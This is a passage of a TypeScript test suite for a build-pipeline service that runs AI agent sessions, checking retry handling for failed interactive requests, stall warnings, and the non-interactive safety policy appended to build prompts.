          sessionId: snapshot.sessions[0]!.sdkSessionId,
        };
      });
      await expect(service.retryInteractionFailure(started.id)).rejects.toThrow(
        "This build has no interactive request failure to retry",
      );
      expect((await pipeline(storage, started.id))).toMatchObject({
        phase: "failed",
        failureContext: { kind: "stage-transition" },
      });
    });
  });

  test("rejects an interaction retry for a phase that owns no stage session", async () => {
    await withService(async (service, storage) => {
      const { started } = await startBuilding(service, storage);
      await mutateStored(storage, started.id, (snapshot) => {
        snapshot.phase = "failed";
        snapshot.error = "The build session requested unexpected authorization";
        snapshot.failureContext = {
          phase: "waiting-for-setup",
          kind: "interactive-request",
          sessionId: snapshot.sessions[0]!.sdkSessionId,
          requestId: "permission-1",
        };
      });

      await expect(service.retryInteractionFailure(started.id)).rejects.toThrow(
        "Cannot retry pipeline phase waiting-for-setup",
      );
      // Rejected before the pipeline is touched, so the failure the user is
      // reading stays intact instead of being revived into a phase that would
      // start its stage twice.
      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "failed",
        failureContext: {
          phase: "waiting-for-setup",
          kind: "interactive-request",
        },
      });
    });
  });

  test("fails an addressing interaction retry that has no structured review", async () => {
    await withService(async (service, storage) => {
      const { started } = await startBuilding(service, storage);
      await mutateStored(storage, started.id, (snapshot) => {
        snapshot.phase = "failed";
        snapshot.error = "The build session requested unexpected authorization";
        delete snapshot.structuredReview;
        snapshot.failureContext = {
          phase: "addressing",
          kind: "interactive-request",
          sessionId: snapshot.sessions[0]!.sdkSessionId,
          requestId: "permission-1",
        };
      });

      expect(await service.retryInteractionFailure(started.id)).toMatchObject({
        phase: "failed",
        error: "Cannot retry addressing without the structured review",
      });
    });
  });

  test("keeps one stall warning per stalled turn and clears it when it ends", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session } = await startBuilding(service, storage);
      const messages = await provider.messages(session.sdkSessionId);
      const stalledAt = new Date(Date.now() - 11 * 60_000).toISOString();
      await mutateStored(storage, started.id, (snapshot) => {
        const current = snapshot.sessions[snapshot.currentSessionIndex]!;
        current.messages = messages;
        current.messagesFingerprint =
          `${messages.length}:${JSON.stringify(messages.at(-1))}`;
        current.startedAt = stalledAt;
        current.messagesPersistedAt = stalledAt;
        current.turnStartedAt = stalledAt;
      });
      provider.status = async () => "running";
      const beforeRevision = (await storage.getBuildPipeline(started.id))!.revision;

      await service.advanceNow(started.id);
      const warnedRecord = (await storage.getBuildPipeline(started.id))!;
      const warned = warnedRecord.snapshot as BuildPipeline;
      // Neither the status nor the transcript moved, so the new warning is the
      // only thing that could have driven this write.
      expect(warnedRecord.revision).toBeGreaterThan(beforeRevision);
      expect(warned.stallWarning?.sessionId).toBe(session.sdkSessionId);

      await service.advanceNow(started.id);
      const secondRecord = (await storage.getBuildPipeline(started.id))!;
      expect(secondRecord.revision).toBe(warnedRecord.revision);
      expect((secondRecord.snapshot as BuildPipeline).stallWarning?.detectedAt)
        .toBe(warned.stallWarning!.detectedAt);

      provider.status = async () => "idle";
      await service.advanceNow(started.id);
      const finished = await pipeline(storage, started.id);
      expect(finished.phase).toBe("reviewing");
      expect(finished.stallWarning).toBeUndefined();
    });
  });

  for (const action of ["pause", "cancel"] as const) {
    test(`${action} clears a stall warning that no longer applies`, async () => {
      await withService(async (service, storage) => {
        const { started, session } = await startBuilding(service, storage);
        await mutateStored(storage, started.id, (snapshot) => {
          snapshot.stallWarning = {
            sessionId: session.sdkSessionId,
            detectedAt: new Date().toISOString(),
          };
        });

        const result = action === "pause"
          ? await service.pause(started.id)
          : await service.cancel(started.id);

        // The warning says the stage "is still running"; a stopped build is not,
        // and no later pass would ever clear it.
        expect(result.phase).toBe(action === "pause" ? "paused" : "failed");
        expect(result.stallWarning).toBeUndefined();
        expect((await pipeline(storage, started.id)).stallWarning).toBeUndefined();
      });
    });
  }

  test("a completing pipeline carries no stall warning", async () => {
    await withService(async (service, storage) => {
      const started = await service.start(startInput());
      for (let pass = 0; pass < 5; pass += 1) {
        await service.advanceNow(started.id);
      }
      expect((await pipeline(storage, started.id)).phase).toBe("creating-pr");
      await mutateStored(storage, started.id, (snapshot) => {
        snapshot.stallWarning = {
          sessionId: snapshot.sessions[snapshot.currentSessionIndex]!.sdkSessionId,
          detectedAt: new Date().toISOString(),
        };
      });

      await service.advanceNow(started.id);

      const completed = await pipeline(storage, started.id);
      expect(completed.phase).toBe("complete");
      expect(completed.stallWarning).toBeUndefined();
    });
  });

  test("appends the unattended policy to the stage and resume prompts", async () => {
    await withService(async (service, storage, provider) => {
      const { started } = await startBuilding(service, storage);
      expect(provider.sent).toHaveLength(1);
      expect(provider.sent[0]?.prompt).toContain(
        "This is a non-interactive build session: no user can answer a provider input request.",
      );
      expect(provider.sent[0]?.prompt).toContain(
        "Never treat the absence of a person as authorization.",
      );

      await service.pause(started.id);
      await service.resume(started.id);
      await service.advanceNow(started.id);

      const resumed = provider.sent.at(-1)!;
      expect(provider.sent).toHaveLength(2);
      expect(resumed.prompt).toContain(
        "Resume the build pipeline from where you left off.",
      );
      expect(resumed.prompt).toContain(
        "This is a non-interactive build session: no user can answer a provider input request.",
      );
      expect((await pipeline(storage, started.id)).phase).toBe("building");
    });
  });
});
